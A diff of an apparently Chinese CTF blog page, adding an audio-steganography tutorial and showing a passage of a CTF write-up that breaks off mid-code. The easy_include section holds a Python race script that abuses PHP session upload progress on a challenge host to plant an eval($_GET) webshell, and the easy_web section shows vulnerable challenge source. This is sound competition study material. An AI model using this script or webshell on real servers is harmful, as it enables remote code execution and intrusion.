@@ -141,12 +141,174 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-元旦水友赛" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-音频隐写" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/">音频隐写</a>
+    </h1>
+  
+
+        
+        <a href="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/" class="archive-article-date">
+  	<time datetime="2025-04-02T06:48:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-02</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h2><p>法一：pearcmd.php文件利用</p>
+        <hr>
+<h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>和图片一样，数字音频也可以用于信息隐写</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 音频载体信号存在冗余，为隐蔽信息提供支持</span><br><span class="line">- 人类听觉系统频谱范围是20Hz18kHz，但对2kHz4kH信息最为敏感</span><br><span class="line">- 人类听觉系统只对相对相位敏感，而无法感知绝对相位</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="解题工具："><a href="#解题工具：" class="headerlink" title="解题工具："></a>解题工具：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- Audacity，开源音频处理软件，分析音频的频谱、波形</span><br><span class="line">- MP3Stego，音频数据分析与隐写工具</span><br><span class="line">- silenteye，一款免费的图片、音频信息隐藏工具，适用于音频中的LSB隐写</span><br><span class="line">- RX-SSTV，慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="摩尔斯电码"><a href="#摩尔斯电码" class="headerlink" title="摩尔斯电码"></a>摩尔斯电码</h3><p>摩尔斯电码也被称作摩斯密码，是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。它发明于1837年，发明者是美国人艾尔菲德·维尔,是一种早期的数字化通信形式。不同于现代化的数字通讯，摩尔斯电码只使用零和一两种状态的二进制代码，它的代码包括五种：短促的点信号“・”，保持一定时间的长信号“—”，表示点和划之间的停顿、每个词之间中等的停顿，以及句子之间长的停顿。</p>
+<ul>
+<li><p>基本信号：短促的滴信号“·”，保持一定时间的嗒信号“-”</p>
+</li>
+<li><p>组成信号：滴&#x3D;1t，嗒&#x3D;3t，滴嗒间&#x3D;1t，字符间&#x3D;3t，单词间&#x3D;7t</p>
+</li>
+</ul>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722043907938-158714be-8a0c-4545-ad69-4feccdae94c5.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AR：·—·—·（停止，消息结束）</span><br><span class="line">AS：·—···（等待）</span><br><span class="line">K：—·—（邀请发射信号）（一般跟随AR，表示“该你了”）</span><br><span class="line">SK：···—·—（终止，联络结束）</span><br><span class="line">BT：—···—（分隔符）</span><br><span class="line">···—·（我将重新发送最后一个单词） </span><br><span class="line">·· ··（同样）</span><br><span class="line">········（错误)</span><br></pre></td></tr></table></figure>
+
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>工具：Audacity</p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722043991093-2a581aee-67b0-4515-b6d2-ede468421fd2.png"></p>
+<p>两端音频，下面那个就是摩斯电码，看一下。<img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722128991510-38b378ad-19b6-4087-b1a5-11d5e47ee949.png">第一段写成..-.，然后每一段之间的停顿代表空格。那么前两段连起来就是..-. —-</p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722129174369-f6e2423b-10b7-42b7-bc26-6a2d3f133db9.png">这后边有一段隔了很长一段，把前后分开解码。</p>
+<p>摩斯密码，audacity打开音频，观察波形，其中断了一次，分别写出两段摩斯：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. ----- ..--- ----. -... -.. -.... ..-. ..... ..... .---- .---- ...-- ----. . . -.. . -... ---.. . ....- ..... .- .---- --... ..... -... ----- --... ---.. -....</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044016403-7523755c-4cb8-469b-9a67-5b1fe0611f87.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. ----- ..--- ----. -... -.. -.... ..-. .....</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044034916-75990e99-87cf-4fb7-ba25-77519bdd0e7c.png"></p>
+<p>发现两端重合了，将前面的那一段转换为小写，放入flag{}中即可。</p>
+<h2 id="音频波形隐写"><a href="#音频波形隐写" class="headerlink" title="音频波形隐写"></a><font style="color:rgba(0, 0, 0, 0.75);">音频波形隐写</font></h2><ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">工具：Audacity</font></li>
+</ul>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044075739-2d56f558-b87c-4597-afd3-8a74c5335da8.png"></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722130427404-1298cf5b-de5b-4a1e-864a-3a1661436e55.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044103091-5208a02d-557d-438e-9702-ef81820efa5b.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;&#x27;内为得到的01</span></span><br><span class="line">f = <span class="string">&#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span> </span><br><span class="line"></span><br><span class="line">f_list = re.findall(<span class="string">&quot;.&#123;7&#125;&quot;</span>, f)</span><br><span class="line">new_text = <span class="string">&quot; 0&quot;</span>.join(f_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;0&#x27;</span> + new_text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044143618-1f3480bb-dcc8-4dcf-a377-f2f1203ac26e.png"></p>
+<h2 id="音频频谱隐写"><a href="#音频频谱隐写" class="headerlink" title="音频频谱隐写"></a><font style="color:rgba(0, 0, 0, 0.75);">音频频谱隐写</font></h2><ul>
+<li><font style="color:rgba(0, 0, 0, 0.75);">工具：Audacity</font></li>
+<li><font style="color:rgba(0, 0, 0, 0.75);">原理：音频中的频谱隐写是将字符串隐藏在频谱中，此类音频通常会有一个较明显的特征，听起来是一段杂音或者比较刺耳。</font></li>
+<li><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722130697827-cb49546e-7b48-4af7-8640-3030e71c85bf.png"></li>
+<li><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044174173-95142073-54db-4619-b7c7-0407eb1b22a3.png"></li>
+</ul>
+<h2 id="MP3编码隐写"><a href="#MP3编码隐写" class="headerlink" title="MP3编码隐写"></a>MP3编码隐写</h2><p>将数据隐藏在MP3文件的奇偶校验块中</p>
+<p>MP3stego</p>
+<p>我们需要将需要处理的音频文件等，放入该目录下</p>
+<p>MP3编码隐写与还原工具使用方法（也有图形化的）：</p>
+<ul>
+<li>数据隐写：encode -E data.txt -P pass svega.wav svega_stego.mp3</li>
+</ul>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044226581-a1544752-adc9-4e96-ae03-d3656fbca294.png"></p>
+<ul>
+<li><font style="color:rgb(77, 77, 77);">数据还原：decode -X -P pass svega_stego.mp3</font></li>
+</ul>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044254446-3e178601-b0da-417b-b007-2110aa019832.png"></p>
+<h2 id="LSB-音频隐写"><a href="#LSB-音频隐写" class="headerlink" title="LSB 音频隐写"></a><font style="color:rgb(77, 77, 77);">LSB 音频隐写</font></h2><ul>
+<li><font style="color:rgb(77, 77, 77);">工具：silenteye</font></li>
+<li><font style="color:rgb(77, 77, 77);">原理：类似于图片隐写中的 LSB 隐写，音频中也有对应的 LSB 隐写。主要可以使用 Silenteye 工具</font></li>
+</ul>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722044277238-eda5f288-5cd5-4d34-a6c3-b84fc9a65662.png"></p>
+<p>上面的key在这<br><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1722133337481-16697ae6-d02f-470c-8eb3-ccff4734b80c.png"></p>
+<h2 id="双声道"><a href="#双声道" class="headerlink" title="双声道"></a>双声道</h2><p><font style="color:rgb(31,35,41);">如果你戴上耳机，左边和右边播放的是不同的数据。</font></p>
+<p><font style="color:rgb(31,35,41);">本题往左声道加了东西，从 45 秒开始，稍微把音量调大⼀点，左边可以听到微弱的嘟嘟声，右边则听不到。没听出来也是符合预期的，出题时故意把它调得很小声，要是直接听出来就没意思了。如果在搜索引擎中搜索“CTF misc 音频”可以看到前辈的总结。</font></p>
+<p><font style="color:rgb(31,35,41);">其中会有用音频处理软件的「反相]功能进行两段音频对比的介绍；根据题目描述「纷扰和喧嚣」和「屏蔽力」可以联想到把音乐去掉然后专心听信号；</font></p>
+<p><font style="color:rgb(31,35,41);">根据题目描述「立体声」和题目名称可以联想到左声道和右声道对比。</font></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724317809168-0f2aa4fe-26fd-4a86-970a-9923f9fc999b.png"></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724317841224-b4437814-6714-4c0f-bc5a-317d1ee546cb.png"></p>
+<p>解题：</p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724317899077-efe062aa-ec68-4974-a2bb-a5fe865a84d6.png"></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724317946403-de666d46-3c75-4224-b68f-b11d97f76a43.png"></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724317965240-e519455f-1444-4e5b-be14-3f951fd43745.png"></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724317982703-a4f5ef71-4649-4048-9b87-6cb6ff9cb849.png"></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724318004195-51c75032-bdb5-41ca-ab13-dc6fbe01be38.png"></p>
+<h3 id="出题过程"><a href="#出题过程" class="headerlink" title="出题过程"></a>出题过程</h3><p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724318043502-61506f48-970b-4aee-b62c-701201e9ea76.png"></p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1724318078232-680ea7de-48e9-4ea3-8660-f81d09aa758e.png"></p>
+<h2 id="文件隐写到音频"><a href="#文件隐写到音频" class="headerlink" title="文件隐写到音频"></a>文件隐写到音频</h2><p>当我们用audience没发现有什么异常时，可以尝试用deep sound来提取看看。</p>
+<p><img src="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/1730269386116-334e96ad-1db0-4b3e-a592-5fdef8ac49c6.png"></p>
+<h2 id="音频转图片"><a href="#音频转图片" class="headerlink" title="音频转图片"></a>音频转图片</h2><p>同样是拿到一段音频没有发现什么时，同时听起来声音很奇怪。可以拖到SSTV里面，有可能就是图片。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2025/04/02/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-元旦水友赛" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/">元旦水友赛</a>
+    </h1>
+  
+
+        
+        <a href="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/" class="archive-article-date">
+  	<time datetime="2025-04-02T06:48:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h2><p>法一：pearcmd.php文件利用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>localhost绕过^[a-z]+。</p>
@@ -157,11 +319,11 @@
 <p>法二：</p>
 <p>session文件包含。</p>
 <p>发现对方开启session，可以尝试。</p>
-<p><img src="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741579210398-0feb5c06-eae4-4118-a19c-baff07852c04.png"></p>
+<p><img src="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741579210398-0feb5c06-eae4-4118-a19c-baff07852c04.png"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://db5a97ad-272f-4126-9938-b997cc17b62f.challenge.ctf.show&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;getshell&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;localhost/tmp/sess_getshell&quot;</span>,<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php phpinfo();eval($_GET[1]);?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&#x27;shell.php&#x27;</span>&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">READ</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>/shell.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+++&#x27;</span>)</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">t1 = threading.Thread(target=POST, args=(session, )).start()</span><br><span class="line">t2 = threading.Thread(target=POST, args=(session, )).start()</span><br><span class="line">READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741580178933-15573c7f-8a24-45ee-8897-4982d10d6c24.png"></p>
-<p><img src="/2025/04/01/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741580187339-416eaa78-ae2d-4185-b868-9688943b5db5.png"></p>
+<p><img src="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741580178933-15573c7f-8a24-45ee-8897-4982d10d6c24.png"></p>
+<p><img src="/2025/04/02/%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/1741580187339-416eaa78-ae2d-4185-b868-9688943b5db5.png"></p>
 <h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">开胃小菜，就让我成为签到题叭 <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Chu0</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;waf1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show/i&#x27;</span>, <span class="variable">$Chu0</span>))</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;waf2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf_in_waf_php</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$count</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$a</span>,<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hinthinthint,base64喔&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ucs-2|phar|data|input|zip|flag|\%/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;fastfast&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>,<span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0 = <span class="string">&#x27;xiuxiuxiu&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">                <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;绕一下吧孩子&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span 